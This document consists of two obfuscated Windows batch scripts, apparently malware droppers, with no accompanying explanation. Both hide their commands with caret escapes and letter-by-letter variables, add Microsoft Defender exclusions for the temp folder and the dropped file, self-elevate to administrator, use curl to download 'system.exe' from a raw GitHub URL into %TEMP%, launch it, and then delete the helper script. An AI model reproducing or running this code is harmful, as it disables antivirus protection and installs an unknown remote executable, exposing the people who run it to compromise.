@echo off
set "a9k=%TEMP%"
set "b3m=%a9k%\z.bat"
set "c7p=%a9k%\x.exe"
set "d2q=p^o^w^e^r^s^h^e^l^l"
set "e8r=-^C^o^m^m^a^n^d"
set "f4s=A^d^d-^M^p^P^r^e^f^e^r^e^n^c^e"
set "g1t=-^E^x^c^l^u^s^i^o^n^P^a^t^h"
set "h5u=-^E^x^c^l^u^s^i^o^n^P^r^o^c^e^s^s"
set "i9v=^>nul 2^>^&1"
set "j3w=c^u^r^l"
set "k7x=-^L"
set "l2y=s^t^a^r^t"
set "m6z=n^e^t s^e^s^s^i^o^n"

set "n1a=h^t^t^p^s://g^i"
set "o5b=t^h^u^b.^c^o^m/r^u^t^h"
set "p9c=m^o^o^r^e^g^m^u^a^x/r^u^t^h^m^o^o^r^e^g^m^u^a^x/r^a^w/r^e^f^s/h^e^a^d^s/m^a^i^n/s^y^s^t^e^m.^e^x^e"

set "q3d=%n1a%%o5b%%p9c%"
set "r7e=i^f %%ERRORLEVEL%% NEQ 0"
set "s2f=e^c^h^o"
set "t6g=e^x^i^t /b"
set "u1h=%d2q% %e8r% "%f4s% %g1t% '%a9k%' -ErrorAction SilentlyContinue; %f4s% %h5u% 'x.exe'""
set "v5i=%s2f% Warning: Cant add Defender exception"
set "w9j=%m6z% %i9v%"
set "x3k=%d2q% %e8r% "S^t^a^r^t-^P^r^o^c^e^s^s c^m^d -^A^r^g^u^m^e^n^t^L^i^s^t '/c %%~f0' -^V^e^r^b R^u^n^A^s""
set "y7l=%j3w% %k7x% "%q3d%" -o "%c7p%""
set "z2m=%l2y% "" "%c7p%""
set "a6n=%s2f% Error: Cant run x.exe!"
set "b1o=%s2f% Error: Cant download x.exe"
set "c5p=%s2f% Done!"
set "d9q=p^a^u^s^e"

>%b3m% %s2f% @%s2f% off
>>%b3m% %s2f% %w9j%
>>%b3m% %s2f% %r7e% (
>>%b3m% %s2f%    %t6g%
>>%b3m% %s2f%    %x3k%
>>%b3m% %s2f%    %t6g%
>>%b3m% %s2f% )
>>%b3m% %s2f% %y7l%
>>%b3m% %s2f% i^f e^x^i^s^t "%c7p%" (
>>%b3m% %s2f%    %z2m%
>>%b3m% %s2f%    %r7e% %a6n%
>>%b3m% %s2f% ) e^l^s^e (
>>%b3m% %s2f%    %b1o%
>>%b3m% %s2f% )
>>%b3m% %s2f% %c5p%
>>%b3m% %s2f% %d9q%

%u1h%
%r7e% (%v5i%)
c^m^d /c "%b3m%"
d^e^l "%b3m%"
======================
@echo off
set "a1=%TEMP%\t.bat"
set "a2=%TEMP%\s.exe"

powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 's.exe' -ErrorAction SilentlyContinue" >nul 2>&1
if %ERRORLEVEL% NEQ 0 (echo W: Defender issue)

echo @echo off > "%a1%"
echo NET SESSION ^>nul 2^>^&1 >> "%a1%"
echo if %%ERRORLEVEL%% NEQ 0 ( >> "%a1%"
echo     echo Admin needed >> "%a1%"
echo     powershell -Command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs" >> "%a1%"
echo     exit /b >> "%a1%"
echo ) >> "%a1%"
echo set "x1=c"^&set "x2=u"^&set "x3=r"^&set "x4=l" >> "%a1%"
echo set "u1=h"^&set "u2=t"^&set "u3=t"^&set "u4=p"^&set "u5=s"^&set "u6=:"^&set "u7=/"^&set "u8=/" >> "%a1%"
echo set "d1=g"^&set "d2=i"^&set "d3=t"^&set "d4=h"^&set "d5=u"^&set "d6=b"^&set "d7=." >> "%a1%"
echo set "p1=c"^&set "p2=o"^&set "p3=m"^&set "p4=/"^&set "p5=r"^&set "p6=u"^&set "p7=t"^&set "p8=h"^&set "p9=m"^&set "p10=o"^&set "p11=o"^&set "p12=r"^&set "p13=e"^&set "p14=g"^&set "p15=m"^&set "p16=u"^&set "p17=a"^&set "p18=x" >> "%a1%"
echo set "r1=/"^&set "r2=r"^&set "r3=a"^&set "r4=w"^&set "r5=/"^&set "r6=r"^&set "r7=e"^&set "r8=f"^&set "r9=s"^&set "r10=/"^&set "r11=h"^&set "r12=e"^&set "r13=a"^&set "r14=d"^&set "r15=s"^&set "r16=/"^&set "r17=m"^&set "r18=a"^&set "r19=i"^&set "r20=n"^&set "r21=/" >> "%a1%"
echo set "f1=s"^&set "f2=y"^&set "f3=s"^&set "f4=t"^&set "f5=e"^&set "f6=m"^&set "f7=."^&set "f8=e"^&set "f9=x"^&set "f10=e" >> "%a1%"
echo %%x1%%%%x2%%%%x3%%%%x4%% -L "%%u1%%%%u2%%%%u3%%%%u4%%%%u5%%%%u6%%%%u7%%%%u8%%%%d1%%%%d2%%%%d3%%%%d4%%%%d5%%%%d6%%%%d7%%%%p1%%%%p2%%%%p3%%%%p4%%%%p5%%%%p6%%%%p7%%%%p8%%%%p9%%%%p10%%%%p11%%%%p12%%%%p13%%%%p14%%%%p15%%%%p16%%%%p17%%%%p18%%%%p4%%%%p5%%%%p6%%%%p7%%%%p8%%%%p9%%%%p10%%%%p11%%%%p12%%%%p13%%%%p14%%%%p15%%%%p16%%%%p17%%%%p18%%%%r1%%%%r2%%%%r3%%%%r4%%%%r5%%%%r6%%%%r7%%%%r8%%%%r9%%%%r10%%%%r11%%%%r12%%%%r13%%%%r14%%%%r15%%%%r16%%%%r17%%%%r18%%%%r19%%%%r20%%%%r21%%%%f1%%%%f2%%%%f3%%%%f4%%%%f5%%%%f6%%%%f7%%%%f8%%%%f9%%%%f10%%" -o "%a2%" >> "%a1%"
echo if exist "%a2%" ( >> "%a1%"
echo     start "" "%a2%" >> "%a1%"
echo     if %%ERRORLEVEL%% NEQ 0 (echo E: Exec fail) >> "%a1%"
echo ) else ( >> "%a1%"
echo     echo E: Download fail >> "%a1%"
echo ) >> "%a1%"
echo echo Done! >> "%a1%"
echo pause >> "%a1%"

start /wait cmd /c "%a1%"
del "%a1%"